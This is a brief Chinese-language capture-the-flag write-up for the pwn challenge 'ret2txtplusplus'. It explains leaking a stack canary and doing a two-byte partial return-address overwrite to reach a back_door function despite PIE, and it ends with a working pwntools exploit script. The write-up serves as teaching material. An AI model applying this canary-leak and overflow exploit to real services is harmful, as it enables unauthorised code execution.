# ret2txtplusplus

## 文件分析

下载`ret2txtpp`, 保护全开  
ghidra分析为64位程序

## 解题思路

总体思路和上一题一致，但是加了pie，但我们又没法获取  
不过这次在vuln函数中运行，那么只要改掉最后2个字节就可以跳转到`back_door`（本来是跳转到main）  
~~如果rsp & 0xf != 0就没辙了~~

注意最后不能用sendline，因为会多填充一个\n导致地址错误  
查看pwntools源码，发现send后会flush，也可以结束读取

## EXPLOIT

```python
from pwn import *
sh = remote(???, 10015)
sh.sendline(b'0'*0x17 + b'.')
sh.recvuntil(b'.\n')
canary = u64(b'\0' + sh.recvline()[:7])
sh.send(b'0'*0x18 + p64(canary) + b'0'*8 + p16(0x08f4))
sh.interactive()
```

Done.
